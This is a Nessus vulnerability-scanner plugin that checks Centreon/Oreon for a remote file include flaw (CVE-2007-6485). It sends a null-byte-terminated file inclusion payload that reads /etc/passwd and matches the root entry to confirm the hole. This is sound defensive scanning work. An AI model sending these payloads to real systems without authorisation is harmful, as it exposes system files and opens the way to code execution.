#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(29722);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2016/08/31 15:08:48 $");

  script_cve_id("CVE-2007-6485");
  script_bugtraq_id(26883);
  script_osvdb_id(39226, 39227);
  script_xref(name:"EDB-ID", value:"4735");

  script_name(english:"Centreon 'fileOreonConf' Parameter File Include Vulnerabilities");
  script_summary(english:"Attempts to read a local file with Centreon.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple remote file include vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Centreon or Oreon, a web-based network
supervision program based on Nagios. 

The version of Centreon / Oreon installed on the remote host fails to
sanitize user-supplied input to the 'fileOreonConf' parameter of the
'MakeXML.php' and 'MakeXML4statusCounter.php' scripts before using it
to include PHP code. Regardless of PHP's 'register_globals' setting,
an unauthenticated, remote attacker can exploit these issues to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(94);

  script_set_attribute(attribute:"plugin_publication_date", value:"2007/12/17");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:centreon:centreon");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:merethis:centreon");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("centreon_detect.nbin");
  script_require_keys("www/PHP", "installed_sw/Centreon");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Centreon";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

errors = FALSE;
vuln = FALSE;

file = "/etc/passwd";
if (thorough_tests) 
{
  exploits = make_list(
    "MakeXML.php?fileOreonConf=" + file + "%00",
    "MakeXML4statusCounter.php?fileOreonConf=" + file + "%00"
  );
}
else 
{
  exploits = make_list(
    "MakeXML.php?fileOreonConf=" + file + "%00"
  );
}

foreach exploit (exploits)
{
  url = "/include/monitoring/engine/" + exploit;
  # Try to retrieve a local file.
  r = http_send_recv3(
    method : "GET",
    port   : port, 
    item   : dir + url,
    exit_on_fail : TRUE
  );
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    ereg(pattern:"root:.*:0:[01]:", string:res, multiline:TRUE) ||
    # we get an error because magic_quotes was enabled or...
    "main(" + file + "\\0www/oreon.conf.php): failed to open stream" >< res ||
    # we get an error claiming the file doesn't exist or...
    "main(" + file + "): failed to open stream: No such file" >< res ||
    # we get an error about open_basedir restriction.
    "open_basedir restriction in effect. File(" + file  >< res
  )
  { 
    vuln = TRUE;
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = res - strstr(res, 'Connecting problems with oreon database');
      break;
    }
    else
    {
      errors = TRUE;
      break; 
    }
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

if (errors)
{
  if (report_verbosity > 0)
  {
    report =
      '\nNessus was not able to exploit the issue, but was able to verify'+
      ' it' + '\nexists by examining the error message returned from the' +
      ' following' + '\nrequest :' +
      '\n' +
      '\n' + install_url + url +
      '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    file        : file,
    line_limit  : 2,
    request     : make_list(install_url + url),
    output      : chomp(contents),
    attach_type : 'text/plain'
  );
}
